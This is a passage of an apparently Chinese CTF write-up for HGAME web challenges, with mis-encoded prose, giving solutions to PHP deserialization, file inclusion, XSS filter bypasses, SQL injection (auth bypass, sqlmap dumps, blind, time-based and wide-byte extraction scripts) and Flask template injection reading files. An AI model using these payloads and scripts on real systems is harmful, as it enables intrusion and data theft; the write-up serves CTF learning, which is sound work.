invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;emmm&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_object</span>(<span class="variable">$emmm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$emmm</span>-&gt;<span class="keyword">public</span> = <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">100000000</span>);</span><br><span class="line">    <span class="variable">$emmm</span>-&gt;secret = <span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">100000000</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$emmm</span>-&gt;<span class="keyword">public</span> == <span class="variable">$emmm</span>-&gt;secret) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br></pre></td></tr></table></figure><p>ç¨å¾®çœ‹ä¸€ä¸‹,å¼•ç”¨ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$public</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$temp</span>=<span class="keyword">new</span> <span class="title function_ invoke__">emmm</span>();</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="keyword">public</span> = &amp;<span class="variable">$temp</span>-&gt;secret;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$temp</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.203.108:10001/random.php?emmm=O:4:%22emmm%22:2:&#123;s:6:%22public%22;N;s:6:%22secret%22;R:2;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag: hgame{&\_Is\_wondeRful!@#}</p><h3 id="è‰è“ç¤¾åŒº-2">è‰è“ç¤¾åŒº-2</h3><p>æ–‡ä»¶åŒ…å«, phpä¼ªåè®®php://filter/read=convert.base64-encode/resource=../flag.php æ‹¿åˆ°ä¸€ä¸ªbase64,è§£ä¸¤æ¬¡ hgame{!m4o\_pi4n\_ChaO\_hao\_kan!}</p><h3 id="è‰è“ç¤¾åŒº-1">è‰è“ç¤¾åŒº-1</h3><p>ç›´æ¥è®¿é—® http://118.25.18.223:10011/show_maopian.php?mao=../flag.php hgame{#Ma0\_pi4n\_haO\_k4n\_ma#}</p><h3 id="xss-1">xss-1</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">charge</span>(<span class="params">input</span>) &#123;</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/script/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/image/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">    input = input.<span class="title function_">replace</span>(<span class="regexp">/\(/</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;article&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/article&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸å…è®¸äº¤äº’ ç›´æ¥imgæ ‡ç­¾.ç„¶åæ‹¬å·è¢«è¿‡æ»¤æ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(-&gt;(</span><br><span class="line">)-&gt;)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;1&quot; onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="xss-2">xss-2</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">charge</span>(<span class="params">input</span>) &#123; </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/script/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/img/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/image/gi</span>, <span class="string">&#x27;_&#x27;</span>); </span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/\(/</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">            input = input.<span class="title function_">replace</span>(<span class="regexp">/\&gt;/</span>,<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>; </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨inputæ ‡ç­¾çš„imageå±æ€§ç»•</p><h5 id="payload">payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; type=&quot;image&quot; src=1 onerror=alert(1);&quot;</span><br></pre></td></tr></table></figure><h3 id="æœ€ç®€å•çš„sqlé¢˜">æœ€ç®€å•çš„sqlé¢˜</h3><p>ä¸‡èƒ½å¯†ç  å¸å·éšæ„ å¯†ç 123'or'1'='1 hgame{@s0ng\_fen\_ti@}</p><h3 id="é€åˆ†çš„sqli">é€åˆ†çš„SQLi</h3><p>sqlmap -u http://118.25.18.223:10068/?id=1 -D week3_sqliiii2 -T f111aa4g --dump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-------+---------------+-----------------------------------+</span><br><span class="line"> id     dajiangyoude   f111aaaggg_w3                     </span><br><span class="line">+-------+---------------+-----------------------------------+</span><br><span class="line"> 10086  kan_wo_gan_ma  hgame&#123;Th3_e4sist_sql_injeCti0n##&#125; </span><br><span class="line">+-------+---------------+-----------------------------------+</span><br></pre></td></tr></table></figure>hgame{Th3\_e4sist\_sql\_injeCti0n##}<h3 id="ç®€å•çš„sqli">ç®€å•çš„SQLi</h3><p>è¦æ±‚è¾“å…¥ä¸€ä¸ªæ»¡è¶³çš„å€¼,ä½¿å…¶hashçš„4-8ä½ä¸ºç›®æ ‡å€¼,ç„¶åå†è¾“å…¥id,ç›´æ¥ä¸Šè„šæœ¬å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> md5 <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³¨:md5è‡ªå·±å†™,è¿™ä¸ªimportçš„æ˜¯æˆ‘å«Œéº»çƒ¦è‡ªå·±åŠ çš„</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_md5</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(each)[<span class="number">4</span>:<span class="number">8</span>]==code:</span><br><span class="line">            <span class="keyword">return</span> each</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">r=u.get(<span class="string">&#x27;http://118.25.18.223:10086/&#x27;</span>)</span><br><span class="line">ok=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">129</span>):</span><br><span class="line">        <span class="comment">#id_1= &quot;1&#x27; and (ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;.format(num=num,each=each)</span></span><br><span class="line">        <span class="comment">#id_1= &quot;1&#x27; and (ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\&quot;w3_fllllllll4ag\&quot;),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;.format(num=num,each=each)</span></span><br><span class="line">        id_1= <span class="string">&quot;1&#x27; and (ascii(mid((select f111144g_w3_sqli1 from w3_fllllllll4ag limit 0,1),&#123;num&#125;,1))=&#123;each&#125;)%23&quot;</span>.<span class="built_in">format</span>(num=num,each=each)</span><br><span class="line">        code = re.findall(<span class="string">r&#x27;:=&quot;(.&#123;4&#125;)&quot;&#x27;</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">        code = find_md5(code)</span><br><span class="line">        r=u.get(<span class="string">&#x27;http://118.25.18.223:10086/?id=&#x27;</span>+<span class="built_in">str</span>(id_1)+<span class="string">&quot;&amp;code=&quot;</span>+<span class="built_in">str</span>(code))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;query ok&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¡¨:users,w3_fllllllll4ag åˆ—:dajiangyoude,haishijiangyou,f111144g_w3_sqli1 flag:hgame{sql\_Injection\_s000oo\_fun}</p><h3 id="æ­£å¸¸çš„sqli">æ­£å¸¸çš„SQLi</h3><p>.bakæ–‡ä»¶æ³„æ¼,æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$re</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $rs[&#x27;flag&#x27;];</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å› ä¸ºå‡ºé¢˜äººå¤ªæ‡’äº†ï¼Œæ‰€ä»¥ç°åœ¨æ²¡æœ‰ä»»ä½•åŠŸèƒ½&quot;</span>;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>å½“å¤©åšçš„æ—¶å€™ä¼¼ä¹é¢˜ç›®æ˜¯å‡ºäº†ç‚¹é—®é¢˜...åæ­£ä¸€ç›´å‡ºé”™æ¥ç€... ä¸è¿‡ç¬¬äºŒå¤©å¥½äº†... è¯­å¥åªæ˜¯æ‰§è¡Œ,æ‰€ä»¥sleepæ³¨ä¸€ä¸‹ ç»™ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        <span class="comment">#data=&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;.format(num=num,ascii1=each)</span></span><br><span class="line">        <span class="comment">#data=&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;user&quot;),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;.format(num=num,ascii1=each)</span></span><br><span class="line">        data=<span class="string">&#x27;&#x27;&#x27;99\&#x27; or if(ascii(substr((select flag from user limit 0,1),&#123;num&#125;,1))=&#123;ascii1&#125;,sleep(5),1)#&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(num=num,ascii1=each)</span><br><span class="line"></span><br><span class="line">        headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;name=&quot;</span>+base64.b64encode(data.encode()).decode()&#125;                    </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://123.206.203.108:10010/normalSQLi/index.php&#x27;</span>,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è¡¨:user åˆ—:id,flag,username ç„¶åæ³¨æ„æœ€åæå–flagçš„æ—¶å€™limitä¸€ä¸‹,åœ¨limit 2,1çš„æ—¶å€™æ‰¾åˆ°flag flag:hgame{fLag\_1s\_h4re.....}</p><h3 id="ä¹¦åº—">**ä¹¦åº—</h3><p>hint:å¤–éƒ¨å®ä½“ ä¸€å‘blind xxe è¯¦æƒ…è§å‰ä¸€ç¯‡moctfçš„é¢˜è§£æœ€åä¸€é¢˜ hgame{Xxe\_v3ry\_funny!!!!}</p><h3 id="ngcs-blog">ngc's blog</h3><p>ä¸€å¼€å§‹æ²¡å•¥æ€è·¯,ç„¶åä¿¡æ¯æ”¶é›†ä¸€ä¸‹ å‘ç°æ˜¯flask,çŒœæƒ³sstl,ç„¶åè¯•äº†ä¸€ä¸‹ è®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa&#123;&#123;7+7&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa14</span><br></pre></td></tr></table></figure><p>å³çŒœæƒ³æ­£ç¡® ç›´æ¥å»æflagå°±ok,æ¨èæ–‡ç« <a href="https://www.cnblogs.com/tyomcat/p/5440488.html">https://www.cnblogs.com/tyomcat/p/5440488.html</a> ç›´æ¥è®¿é—®:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/aaaaaaaaa&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag:hgame{skdvhdsbvadvnjVADBVS}</p><h3 id="åˆåŒå’å•æ˜¯sqli">åˆåŒå’å•æ˜¯SQLI</h3><p>index.php~æ³„æ¼æ‹¿åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line">    <span class="variable">$waf</span>=<span class="string">&quot;/(sleepbenchmarkuniongroup by=&gt;&lt;hex lowerstrcmpupdatexmlxmlelementextractvalueconcatbinsleepmid\(substrleftascii\/\*\*\/)/i&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$waf</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$user</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$user</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&#x27;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $user.&quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$passwd</span>,<span class="variable">$database</span>);</span><br><span class="line">        <span class="variable">$sqli</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;gbk&quot;</span>);</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;select * from users where username=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$sqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        <span class="comment">//echo $sqli-&gt;error;</span></span><br><span class="line">        <span class="variable">$num</span>=<span class="number">0</span>;</span><br><span class="line">        @<span class="variable">$num</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="number">0</span>].<span class="string">&quot;Â Â Â Â &quot;</span>.<span class="variable">$row</span>[<span class="number">1</span>].<span class="string">&quot;Â Â Â &quot;</span>.<span class="variable">$row</span>[<span class="number">2</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸€ä¸‹,likeæ²¡è¿‡æ»¤,æ”¾ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">res = []</span><br><span class="line">ok=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        <span class="comment">#payload = &quot;lalalala%df&#x27;or(select(table_name)from(information_schema.tables)where(table_schema%0alike%0adatabase())limit%0a0,1)like\&quot;&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;lalalala%df&#x27;or(select(column_name)from(information_schema.columns)where(table_name%0alike\&quot;flllllag\&quot;)limit%0a1,1)like\&quot;&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;lalalala%df&#x27;or(select%0athisisflag%0afrom(flllllag)limit%0a0,1)like%0a0x&quot;</span></span><br><span class="line">        payload = <span class="built_in">list</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(each)!=<span class="string">&#x27;%&#x27;</span> <span class="keyword">and</span> <span class="built_in">chr</span>(each)!=<span class="string">&quot;_&quot;</span>:</span><br><span class="line">            res.append(<span class="built_in">str</span>(<span class="built_in">hex</span>(each))[<span class="number">2</span>:])</span><br><span class="line">            payload.append(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">            payload.append(<span class="string">&#x27;25%23&#x27;</span>)</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://118.25.18.223:10088/?user=&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(payload))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;guest&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="string">&quot;5c&quot;</span>)</span><br><span class="line">            res.append(<span class="built_in">str</span>(<span class="built_in">hex</span>(each))[<span class="number">2</span>:])</span><br><span class="line">            payload.append(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">            payload.append(<span class="string">&#x27;25%23&#x27;</span>)</span><br><span class="line">            r=requests.get(<span class="string">&#x27;http://118.25.18.223:10088/?user=&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(payload))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;guest&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.pop()</span><br><span class="line">                res.pop()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> each==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag hgame{like!injection!so!g00d##}</p><h3 id="æ•£è½çš„flag">æ•£è½çš„flag</h3><p>è€ƒçš„å‰ç«¯,åšå‡ºæ¥äº†éƒ½è¿˜æ²¡å‘ç°... çœ‹ä¸ªjs,å‘ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">get_userinfo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> user = $(<span class="string">&quot;#user&quot;</span>).<span class="title function_">text</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123; </span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;check_user.php&quot;</span>,   </span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>, </span><br><span class="line">        <span class="attr">data</span>:&#123;<span class="attr">username</span>:user&#125;, </span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>, </span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;   </span><br><span class="line">            $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">html</span>(<span class="string">&#x27;Error loading XML document&#x27;</span>);   </span><br><span class="line">        &#125;,   </span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data,status</span>)&#123;</span><br><span class="line">           $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;username: &quot;</span>+data[<span class="number">0</span>]);</span><br><span class="line">           $(<span class="string">&quot;#secret&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;secret: &quot;</span>+data[<span class="number">1</span>]);</span><br><span class="line">        &#125; </span><br><span class="line">   &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="title function_">get_userinfo</span>());</span><br></pre></td></tr></table></figure><p>ç„¶åå»ffçš„hackbarå‘åŒ…, å‘ä¸ªadminæ‹¿åˆ°10c546b2cf68 å‘ä¸ªadmin1æ‹¿åˆ°hgame{0102940de1 æ³¨å†Œç„¶åæ‰¾å›å¯†ç 